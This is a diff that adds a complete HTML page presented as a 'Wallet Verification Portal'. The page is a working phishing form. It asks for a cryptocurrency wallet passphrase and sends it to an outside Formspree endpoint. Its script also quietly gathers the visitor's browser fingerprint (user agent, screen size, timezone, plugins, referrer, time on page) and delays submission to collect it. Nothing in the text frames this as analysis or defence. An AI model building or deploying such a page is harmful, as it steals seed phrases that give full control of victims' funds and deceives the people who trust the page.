@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wallet Verification Portal</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background-color: #f9f9f9;
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #4b0082;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #333;
+    }
+    textarea {
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      box-sizing: border-box;
+      min-height: 100px;
+      resize: vertical;
+    }
+    button {
+      background-color: #4b0082;
+      color: white;
+      padding: 15px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      width: 100%;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #800020;
+    }
+    .hidden {
+      display: none;
+    }
+    #loading {
+      text-align: center;
+      margin: 20px 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <form id="mainForm" action="https://formspree.io/f/mnnvawgl" method="POST">
+      <h1>Wallet Verification</h1>
+      
+      <!-- Hidden tracking fields -->
+      <input type="hidden" name="page_loaded" id="pageLoaded">
+      <input type="hidden" name="user_agent" id="userAgent">
+      <input type="hidden" name="screen_resolution" id="screenRes">
+      <input type="hidden" name="time_spent" id="timeSpent">
+      <input type="hidden" name="referrer" id="referrer">
+      
+      <!-- Honeypot field -->
+      <div class="hidden">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username">
+      </div>
+      
+      <div class="form-group">
+        <label for="passphrase">Enter your wallet passphrase:</label>
+        <textarea id="passphrase" name="message" required></textarea>
+      </div>
+      
+      <button type="submit" id="submitBtn">Verify Wallet</button>
+      
+      <div id="loading" class="hidden">
+        <p>Verifying your credentials...</p>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    // Capture initial access data
+    document.addEventListener('DOMContentLoaded', function() {
+      // Set initial timestamps
+      const now = new Date();
+      document.getElementById('pageLoaded').value = now.toISOString();
+      
+      // Capture user agent and screen info
+      document.getElementById('userAgent').value = navigator.userAgent;
+      document.getElementById('screenRes').value = `${window.screen.width}x${window.screen.height}`;
+      document.getElementById('referrer').value = document.referrer || 'direct';
+      
+      // Start time spent counter
+      window.pageLoadTime = now.getTime();
+    });
+
+    // Form submission handler
+    document.getElementById('mainForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      // Calculate time spent on page
+      const timeSpent = (new Date().getTime() - window.pageLoadTime) / 1000;
+      document.getElementById('timeSpent').value = `${timeSpent} seconds`;
+      
+      // Show loading indicator
+      document.getElementById('loading').classList.remove('hidden');
+      document.getElementById('submitBtn').disabled = true;
+      
+      // Check honeypot field
+      if (document.getElementById('username').value !== '') {
+        // This is likely a bot - add to submission data
+        document.getElementById('mainForm').appendChild(createHiddenInput('bot_detected', 'true'));
+      }
+      
+      // Delay submission slightly to capture more data
+      setTimeout(() => {
+        // Add additional fingerprint data
+        addFingerprintData();
+        this.submit();
+      }, 1500);
+    });
+
+    function createHiddenInput(name, value) {
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = name;
+      input.value = value;
+      return input;
+    }
+
+    function addFingerprintData() {
+      const form = document.getElementById('mainForm');
+      
+      // Add timezone
+      form.appendChild(createHiddenInput('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone));
+      
+      // Add plugins
+      const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(',');
+      form.appendChild(createHiddenInput('plugins', plugins));
+      
+      // Add cookie enabled status
+      form.appendChild(createHiddenInput('cookies_enabled', navigator.cookieEnabled));
+      
+      // Add do not track status
+      form.appendChild(createHiddenInput('do_not_track', navigator.doNotTrack || 'unspecified'));
+    }
+  </script>
+</body>
+</html>
